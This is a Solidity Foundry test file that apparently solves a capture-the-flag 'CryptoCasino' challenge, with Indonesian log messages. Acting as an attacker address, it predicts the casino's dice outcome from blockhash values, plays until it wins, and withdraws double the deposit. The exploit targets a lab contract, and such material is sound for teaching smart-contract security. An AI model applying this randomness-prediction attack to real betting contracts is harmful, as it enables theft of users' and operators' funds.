// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "./CryptoCasino.sol";

contract TestCryptoCasino is Test {
    DUCoin du;
    Casino casino;
    uint256 anvil = vm.createFork(vm.envString("ANVIL"));
    address creator = vm.addr(vm.envUint("CREATOR"));
    address attacker = vm.addr(vm.envUint("ATTACKER"));

    function setUp() external {
        vm.selectFork(anvil);
        vm.startPrank(creator);
        console.log("deploy contract DU Coin");
        du = new DUCoin();
        console.log("DU Coin terdeploy di ", address(du));
        console.log("deploy contract casino");
        casino = new Casino(address(du));
        console.log("casino terdeploy di", address(casino));
        console.log("mint du coin ke casino");
        du.freeMoney(address(casino));
        vm.stopPrank();
    }

    function testBetting() external {
        vm.selectFork(anvil);
        vm.startPrank(attacker);
        console.log("faucet");
        casino.getTrialCoins();
        console.log("balance du coin", du.balanceOf(attacker));
        console.log("approve du coin ke casino");
        du.approve(address(casino), 7);
        console.log("approved");
        console.log("deposit ke casino");
        casino.deposit(7);
        for (uint256 i = 0; i < 100; i++) {
            vm.roll(block.number + i);
            uint256 ab = uint256(blockhash(block.number - 1));
            uint256 a = ab & 0xffffffff;
            uint256 b = (ab >> 32) & 0xffffffff;
            uint256 x = uint256(blockhash(block.number));
            uint8 y = uint8((a * x + b) % 6);
            require(y == 0, "nanti bang");
            try casino.play(7) {
                console.log("roll", y);
                break;
            } catch {}
        }
        console.log("menang");
        casino.withdraw(14);
        assertEq(du.balanceOf(attacker), 14);
    }
}
